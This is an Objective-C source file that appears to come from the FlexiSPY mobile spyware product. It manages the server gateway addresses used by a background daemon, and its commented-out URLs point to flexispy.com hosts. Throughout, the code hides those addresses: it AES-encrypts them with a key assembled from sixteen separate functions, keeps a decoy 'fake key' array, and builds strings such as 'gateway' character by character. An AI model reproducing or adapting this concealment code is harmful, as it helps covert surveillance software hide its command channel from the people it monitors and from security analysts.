//
//  ServerAddressManagerImp.m
//  Source-ServerAddressManager
//
//  Created by Dominique  Mayrand on 11/22/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "ServerAddressManagerImp.h"
#import "ServerAddressChangeDelegate.h"
#import "NSDATA-AES.h"
#import "AESCryptor.h"
#import "DaemonPrivateHome.h"
#import "AutomateAESKeyURL.h"

#define SERVER_PATH			@"fse.bin"
#define SERVER_PATH_REQU	@"fse-r.bin"

// key to decrypt urls (fake key)
static const char kKey[] = {10, 0, 23, 7, 31, 13, 1, 12, 9, 16, 19, 7, 11, 21, 29, 18};

@interface ServerAddressManagerImp(private)
- (NSString*) getGateWay;
- (NSString*) getUnstructured;
- (NSString*) getBase;
- (NSString*) getFilePath;
- (void) doSetBaseServerUrl:(NSString*) aUrl;

- (NSData *) decryptData: (NSData *) aUrlAndLengthData;
- (NSString *) stringFromURLData: (NSData *) aDecryptedData;
- (NSData *) decryptBaseURL: (NSData *) aBaseURLData;

// User Url Util
- (NSData *) toData: (NSArray *) aUrlArray;
- (NSData *) encrypt: (NSData *) aUrlAndLengthData;
- (NSMutableArray *) transferDataToArray: (NSData *) aData;
    
- (void) notifyDelegate;
@end

@implementation ServerAddressManagerImp

@synthesize mIsRequiredBaseServer, mServerBaseUrlCipher, mSignUpUrlCipher;

- (id) init
{
	self = [super init];
	if (self)
	{
		// In IOS 6, encryption with wrong key cause application parse the garbage from encryption API make application crash
	}
	return (self);
}

- (id) initWithServerAddressChangeDelegate: (id <ServerAddressChangeDelegate>) aServerAddressChangeDelegate {
	if ((self = [self init])) {
		mDelegate = aServerAddressChangeDelegate;
		[mDelegate retain];
	}
	return (self);
}

+ (NSString *) decryptCipher: (NSData *) aCipher {
    ServerAddressManagerImp *urlManager = [[[ServerAddressManagerImp alloc] init] autorelease];
    NSData *plaintData = [urlManager decryptData:aCipher];
    return ([urlManager stringFromURLData:plaintData]);
}

#pragma mark - Protocol methods -

#define REQUIRED_SPACE 1

- (void) setBaseServerUrl:(NSString*) aUrl {
	[self doSetBaseServerUrl:aUrl];
	[self notifyDelegate];
}

- (void) setBaseServerCipherUrl: (NSData *) aCipherUrl {
	DLog (@"Server base cipher, aCipherUrl = %@", aCipherUrl);
    
    [self setMServerBaseUrlCipher:aCipherUrl];
	
	/**************************************************************************************
     Legacy: The data store in file is not in form of [length] + [raw data] so we need to
     decrypt cipher url then convert to string after that use setBaseServerUrl method
     in order to reuse legacy implementation
     **************************************************************************************/
    
	NSData *urlData = [self decryptData:aCipherUrl];
	DLog (@"Server base plain, urlData = %@", urlData);
	
	NSString *url = [self stringFromURLData:urlData]; // auto release
	DLog (@"Server url, url = %@", url);
	
    [self setBaseServerUrl:url];
}

- (void) setRequireBaseServerUrl:(bool) aRequired{
	[self setMIsRequiredBaseServer:aRequired];
}

- (NSString*) getHostServerUrl {
	NSString *baseServer = @"";
	if([self mIsRequiredBaseServer]){
		baseServer = [self getStructuredServerUrl];
	}
	DLog (@"Host url that need to send via protocol = %@", baseServer);
	return baseServer;
}

- (NSString*) getStructuredServerUrl{
	NSString* url = nil;
	NSString* base = [self getBase];
	if(base) {
		url = [[NSString alloc]  initWithFormat:@"%@/%@",base, [self getGateWay]];
		[url autorelease];
	}
	DLog (@"Structure url = %@", url);
    
    return url;
    //return (@"http://csmobile.rs.mobilefonex.com/gateway");
    //return (@"http://dev-csmobile.flexispy.com/gateway");
	//return (@"http://svr-csmobile.flexispy.com/gateway");
    //return (@"http://192.168.2.93:9090/core/gateway");
    //return (@"http://192.168.2.93:8080/core/gateway");
}

- (NSString*) getUnstructuredServerUrl{
	NSString* url = nil;
	NSString* base = [self getBase];
	if(base){
		url = [[NSString alloc] initWithFormat:@"%@/%@/%@",base, [self getGateWay], [self getUnstructured]];
	}
	if(url) [url autorelease];
	
    return url;
    //return (@"http://csmobile.rs.mobilefonex.com/gateway/unstructured");
	//return (@"http://dev-csmobile.flexispy.com/gateway/unstructured");
	//return (@"http://svr-csmobile.flexispy.com/gateway/unstructured");
    //return (@"http://192.168.2.93:9090/core/gateway/unstructured");
    //return (@"http://192.168.2.93:8080/core/gateway/unstructured");
}

- (BOOL) verifyURL: (NSString *) aUrl {
	//NSString *urlRegEx =@"(http|https)://((\\w)*|([0-9]*)|([-|_])*)+([\\.|/]((\\w)*|([0-9]*)|([-|_])*))+";
	NSString *urlRegEx =@"((mailto\\:|(news|(ht|f)tp(s?))\\://){1}\\S+)";
	NSPredicate *urlCheck = [NSPredicate predicateWithFormat:@"SELF MATCHES %@", urlRegEx]; 
	return [urlCheck evaluateWithObject:aUrl];
}

#pragma mark -
#pragma mark User URLs
#pragma mark -

- (void) addUserURLs: (NSArray *) aUrls {
	NSMutableArray *userUrls = [NSMutableArray arrayWithArray:[self userURLs]];
    
    for (NSString *url in aUrls) {
        [userUrls addObject:url];
    }
	
    [self resetUserURLs:userUrls];
}

- (void) resetUserURLs: (NSArray *) aUrls {
    NSData *urlsData = [self toData:aUrls];
	NSData *encryptedUrlsData = [self encrypt:urlsData];
	
	// Write user URLs to file
	NSString *path = [self getFilePath];
	path = [path stringByAppendingString:SERVER_PATH_REQU];
	[encryptedUrlsData writeToFile:path atomically:NO];
    
    [self notifyDelegate];
}

- (void) clearUserURLs {
    // Delete file storing user url
	NSString *path = [self getFilePath];
	path = [path stringByAppendingString:SERVER_PATH_REQU];
	NSFileManager *fileManager = [NSFileManager defaultManager];
	if ([fileManager fileExistsAtPath:path]) {
		[fileManager removeItemAtPath:path error:nil];
        
        [self notifyDelegate];
	} else {
		DLog(@"{Clear} User url file doesn't exist");
	}
}

- (NSArray* ) userURLs {
    NSArray *userUrls = [NSArray array];
    
	NSString *path = [self getFilePath];
	path = [path stringByAppendingString:SERVER_PATH_REQU];
    NSFileManager *fileManager = [NSFileManager defaultManager];
    if ([fileManager fileExistsAtPath:path]) {
        // Read file that stores user URLs
        NSData *encryptedUrlsData = [NSData dataWithContentsOfFile:path];
        if ([encryptedUrlsData length]) {
            // Decrypt urls data
            NSData *urlsData = [self decryptData:encryptedUrlsData];
            userUrls = [NSArray arrayWithArray:[self transferDataToArray:urlsData]];
        }
    } else {
		DLog(@"{Query} User url file doesn't exist");
	}
	return (userUrls);
}

#pragma mark -
#pragma mark Sign up Url
#pragma mark -

- (void) setSignUpCipherUrl: (NSData *) aCipherUrl {
    [self setMSignUpUrlCipher:aCipherUrl];
}

- (NSString *) signUpUrl {
	NSData *signUpUrlPlainData = [self decryptData:[self mSignUpUrlCipher]];
	NSString *signUpUrlString = [self stringFromURLData:signUpUrlPlainData];
	DLog (@"Sign up url = %@", signUpUrlString);
	return (signUpUrlString);
}

#pragma mark -
#pragma mark Util methods
#pragma mark -

- (NSString*) getGateWay{
	//gateway
	NSString* info = [[[NSString alloc] initWithString:@"g"]autorelease];
	info = [info stringByAppendingString:@"a"];
	info = [info stringByAppendingString:@"t"];
	info = [info stringByAppendingString:@"e"];
	info = [info stringByAppendingString:@"w"];
	info = [info stringByAppendingString:@"a"];
	info = [info stringByAppendingString:@"y"];
	return info;
}

- (NSString*) getUnstructured{
	//unstructured
	NSString* info = [[[NSString alloc] initWithString:@"u"] autorelease];
	info = [info stringByAppendingString:@"n"];
	info = [info stringByAppendingString:@"s"];
	info = [info stringByAppendingString:@"t"];
	info = [info stringByAppendingString:@"r"];
	info = [info stringByAppendingString:@"u"];
	info = [info stringByAppendingString:@"c"];
	info = [info stringByAppendingString:@"t"];
	info = [info stringByAppendingString:@"u"];
	info = [info stringByAppendingString:@"r"];
	info = [info stringByAppendingString:@"e"];
	info = [info stringByAppendingString:@"d"];
	return info;
}

- (NSString*) getBase {
	NSString *baseUrl   = nil;
	NSString *path      = [self getFilePath];
	NSString *filePath  = [path stringByAppendingString:SERVER_PATH_REQU];
    
    NSData *data = nil;
    NSFileManager *fileManager = [NSFileManager defaultManager];
    
    // Always check user url first
    if ([fileManager fileExistsAtPath:filePath]) {
        // Array must have element otherwise BUG
        NSArray *userUrls = [self userURLs];
        baseUrl = [userUrls objectAtIndex:0];
    } else {
        filePath = [path stringByAppendingString:SERVER_PATH];
        data = [NSData dataWithContentsOfFile:filePath];
        
        DLog (@"Server base cipher, data = %@", data);
        if(data){
            AESCryptor* crypt = [[AESCryptor alloc] init];
            if(crypt){
                // Fake
                //NSString* keystring = [[NSString alloc]initWithBytes:kKey length:sizeof(kKey)/sizeof(unsigned char) encoding:NSASCIIStringEncoding];
                NSString* keystring = [[NSString alloc]initWithBytes:kKey length:sizeof(kKey)/sizeof(unsigned char) encoding:NSUTF8StringEncoding];
                DLog (@"Server base cipher key = %@, length = %lu", keystring, (unsigned long)[keystring length]);
                
                char urlKey[16];
                urlKey[0] = url0();
                urlKey[1] = url1();
                urlKey[2] = url2();
                urlKey[3] = url3();
                urlKey[4] = url4();
                urlKey[5] = url5();
                urlKey[6] = url6();
                urlKey[7] = url7();
                urlKey[8] = url8();
                urlKey[9] = url9();
                urlKey[10] = url10();
                urlKey[11] = url11();
                urlKey[12] = url12();
                urlKey[13] = url13();
                urlKey[14] = url14();
                urlKey[15] = url15();
                
                // Bad thing is that aesKey could be nil (unpredictable depend on auto-generate keys)
                //			NSString *aesKey = [[[NSString alloc] initWithBytes:urlKey
                //														 length:16
                //													   encoding:NSUTF8StringEncoding] autorelease];
                
                NSData *aesKey = [NSData dataWithBytes:urlKey length:16];
                
                // Obsolete
                //			NSData* decryptedData = [crypt decrypt:data withKey:aesKey];
                
                NSData *decryptedData = [crypt decryptv2:data withKey:aesKey];
                DLog (@"Server base plain, decryptedData = %@", decryptedData);
                if(decryptedData)
                {
                    baseUrl = [[[NSString alloc] initWithData:decryptedData encoding:NSUTF8StringEncoding] autorelease];
                    if(baseUrl == nil){
                        DLog(@"base URL nil");
                    }
                }else{
                    DLog(@"No data do decrypt");
                }
                [keystring release];
            }
            [crypt release];
        } else {
            DLog(@"Could not read the file");
        }
    }
	return baseUrl;
}

- (NSString*) getFilePath {
	NSString *path = [NSString stringWithFormat:@"%@servaddr/", [DaemonPrivateHome daemonPrivateHome]];
	[DaemonPrivateHome createDirectoryAndIntermediateDirectories:path];
	return path;
}

- (void) doSetBaseServerUrl:(NSString*) aUrl {
	if(aUrl) {
		AESCryptor* cryptor = [[AESCryptor alloc] init];
		if(cryptor){
			NSData* data = [aUrl dataUsingEncoding:NSUTF8StringEncoding];
			DLog(@"data before write to file = %@", data);
			if(data){
				// Fake
				//NSString* keystring = [[NSString alloc]initWithBytes:kKey length:sizeof(kKey)/sizeof(unsigned char) encoding:NSASCIIStringEncoding];
				NSString* keystring = [[NSString alloc]initWithBytes:kKey length:sizeof(kKey)/sizeof(unsigned char) encoding:NSUTF8StringEncoding];
				
				char urlKey[16];
				urlKey[0] = url0();
				urlKey[1] = url1();
				urlKey[2] = url2();
				urlKey[3] = url3();
				urlKey[4] = url4();
				urlKey[5] = url5();
				urlKey[6] = url6();
				urlKey[7] = url7();
				urlKey[8] = url8();
				urlKey[9] = url9();
				urlKey[10] = url10();
				urlKey[11] = url11();
				urlKey[12] = url12();
				urlKey[13] = url13();
				urlKey[14] = url14();
				urlKey[15] = url15();
				
				// Bad thing is that aesKey could be nil (unpredictable depend on auto-generate keys)
                //				NSString *aesKey = [[[NSString alloc] initWithBytes:urlKey
                //															 length:16
                //														   encoding:NSUTF8StringEncoding] autorelease];
				
				NSData *aesKey = [NSData dataWithBytes:urlKey length:16];
				
				// Obsolete
                //				NSData* encryptedData = [cryptor encrypt:data withKey:aesKey];
				
				NSData *encryptedData = [cryptor encryptv2:data withKey:aesKey];
				if(encryptedData){
					NSString *path = [self getFilePath];
					path = [path stringByAppendingString:SERVER_PATH];
					BOOL res = [encryptedData writeToFile:path atomically:YES];
					if(res == NO)
					{
						DLog(@"Could not save to file");
					}
				}
				[keystring release];
			}
		}
		[cryptor release];
	}
}

- (NSData *) decryptData: (NSData *) aUrlAndLengthData {
	AESCryptor *cryptor = [[AESCryptor alloc] init];
	// Fake
	NSString *key = [[NSString alloc] initWithBytes:kKey length:sizeof(kKey)/sizeof(unsigned char) encoding:NSUTF8StringEncoding];
	
	char urlKey[16];
	urlKey[0] = url0();
	urlKey[1] = url1();
	urlKey[2] = url2();
	urlKey[3] = url3();
	urlKey[4] = url4();
	urlKey[5] = url5();
	urlKey[6] = url6();
	urlKey[7] = url7();
	urlKey[8] = url8();
	urlKey[9] = url9();
	urlKey[10] = url10();
	urlKey[11] = url11();
	urlKey[12] = url12();
	urlKey[13] = url13();
	urlKey[14] = url14();
	urlKey[15] = url15();
	
	// Bad thing is that aesKey could be nil (unpredictable depend on auto-generate keys)
    //	NSString *aesKey = [[[NSString alloc] initWithBytes:urlKey
    //												 length:16
    //											   encoding:NSUTF8StringEncoding] autorelease];
	
	NSData *aesKey = [NSData dataWithBytes:urlKey length:16];
	
	// Obsolete
    //	NSData *decryptedData = [[cryptor decrypt:aUrlAndLengthData withKey:aesKey] retain];
	
	NSData *decryptedData = [[cryptor decryptv2:aUrlAndLengthData withKey:aesKey] retain];
	[cryptor release];
	[key release];
	return [decryptedData autorelease];
}

- (NSString *) stringFromURLData: (NSData *) aDecryptedData {
	DLog(@"stringFromURLData, aDecryptedData = %@", aDecryptedData);
	NSInteger sizeOfUrl = 0;
	[aDecryptedData getBytes:&sizeOfUrl length:sizeof(int32_t)];
	
	NSRange range = NSMakeRange(sizeof(int32_t), sizeOfUrl);
	NSData *urlData = [aDecryptedData subdataWithRange:range];
	
	NSString *urlString = [[NSString alloc] initWithData:urlData encoding:NSUTF8StringEncoding];
	return [urlString autorelease];
}

- (NSData *) decryptBaseURL: (NSData *) aBaseURLData {
	AESCryptor *cryptor = [[AESCryptor alloc] init];
	// Fake
	NSString *aKey = [[NSString alloc] initWithBytes:kKey length:sizeof(kKey)/sizeof(unsigned char) encoding:NSUTF8StringEncoding];
	
	char urlKey[16];
	urlKey[0] = url0();
	urlKey[1] = url1();
	urlKey[2] = url2();
	urlKey[3] = url3();
	urlKey[4] = url4();
	urlKey[5] = url5();
	urlKey[6] = url6();
	urlKey[7] = url7();
	urlKey[8] = url8();
	urlKey[9] = url9();
	urlKey[10] = url10();
	urlKey[11] = url11();
	urlKey[12] = url12();
	urlKey[13] = url13();
	urlKey[14] = url14();
	urlKey[15] = url15();
	
	// Bad thing is that aesKey could be nil (unpredictable depend on auto-generate keys)
    //	NSString *aesKey = [[[NSString alloc] initWithBytes:urlKey
    //												 length:16
    //											   encoding:NSUTF8StringEncoding] autorelease];
	
	NSData *aesKey = [NSData dataWithBytes:urlKey length:16];
	
	// Obsolete
    //	NSData *decryptedData = [[cryptor decrypt:aBaseURLData withKey:aesKey] retain];
	
	NSData *decryptedData = [[cryptor decryptv2:aBaseURLData withKey:aesKey] retain];
	[cryptor release];
	[aKey release];
	return [decryptedData autorelease];
}

- (NSData *) toData: (NSArray *) aUrlArray {
	NSMutableData* data = [[NSMutableData alloc] init];
	
	// append a number of array elements, size of each element and each element to the data
	NSInteger numberOfElements = [aUrlArray count];
	[data appendBytes:&numberOfElements length:sizeof(int32_t)];
    //DLog(@"numberOfElements: %ld", (long)numberOfElements);
	
	// append the size of each element and element itself
	for (NSString *anElement in aUrlArray) {
		NSInteger sizeOfAnElement = [anElement lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
		[data appendBytes:&sizeOfAnElement length:sizeof(int32_t)];
        //DLog(@"sizeOfAnElement: %ld", (long)sizeOfAnElement);
		
		NSData *elementData = [anElement dataUsingEncoding:NSUTF8StringEncoding];
		[data appendData:elementData];
	}
	[data autorelease];
	return data;
}

- (NSData *) encrypt: (NSData *) aUrlAndLengthData {
	AESCryptor *cryptor = [[AESCryptor alloc] init];
	// Fake
	NSString *key = [[NSString alloc] initWithBytes:kKey length:sizeof(kKey)/sizeof(unsigned char) encoding:NSUTF8StringEncoding];
	
	char urlKey[16];
	urlKey[0] = url0();
	urlKey[1] = url1();
	urlKey[2] = url2();
	urlKey[3] = url3();
	urlKey[4] = url4();
	urlKey[5] = url5();
	urlKey[6] = url6();
	urlKey[7] = url7();
	urlKey[8] = url8();
	urlKey[9] = url9();
	urlKey[10] = url10();
	urlKey[11] = url11();
	urlKey[12] = url12();
	urlKey[13] = url13();
	urlKey[14] = url14();
	urlKey[15] = url15();
	
	// Bad thing is that aesKey could be nil (unpredictable depend on auto-generate keys)
//	NSString *aesKey = [[[NSString alloc] initWithBytes:urlKey
//												 length:16
//											   encoding:NSUTF8StringEncoding] autorelease];
	
	NSData *aesKey = [NSData dataWithBytes:urlKey length:16];
	
	// Obsolete
//	NSData* encryptedData = [cryptor encrypt:aUrlAndLengthData withKey:aesKey];
	
	NSData *encryptedData = [[cryptor encryptv2:aUrlAndLengthData withKey:aesKey] retain];
	
	[cryptor release];
	[key release];
	return	[encryptedData autorelease];
}

- (NSMutableArray *) transferDataToArray: (NSData *) aData {
	DLog (@"transferDataToArray, aData = %@", aData);
	// get a number of elements in array
	NSInteger numberOfElements = 0;
	[aData getBytes:&numberOfElements length:sizeof(int32_t)];
	NSInteger location = sizeof(int32_t);
    //DLog(@"location: %ld, numberOfElements: %ld", (long)location, (long)numberOfElements);
		
	NSMutableArray *array = [[NSMutableArray alloc] init];
	for (int i = 0; i < numberOfElements; i++) {
		NSRange range = NSMakeRange(location, sizeof(int32_t));		
		NSInteger sizeOfAnElement = 0;
		[aData getBytes:&sizeOfAnElement range:range];
		location += sizeof(int32_t);
        //DLog(@"location: %ld, sizeOfAnElement: %ld", (long)location, (long)sizeOfAnElement);
		
		range = NSMakeRange(location, sizeOfAnElement);
		NSData *elementData = [aData subdataWithRange:range];		
		NSString *elementString = [[NSString alloc] initWithData:elementData encoding:NSUTF8StringEncoding];
		location += sizeOfAnElement;
        //DLog(@"location: %ld, sizeOfAnElement: %ld", (long)location, (long)sizeOfAnElement);
		
		[array addObject:elementString];
		[elementString release];
	}
	return [array autorelease];
}
    
- (void) notifyDelegate {
    if ([mDelegate respondsToSelector:@selector(serverAddressChanged)]) {
		[mDelegate serverAddressChanged];
	}
}

#pragma mark -
#pragma mark Memory management
#pragma mark -

- (void) dealloc {
	[mDelegate release];
    [mServerBaseUrlCipher release];
    [mSignUpUrlCipher release];
	[super dealloc];
}

@end
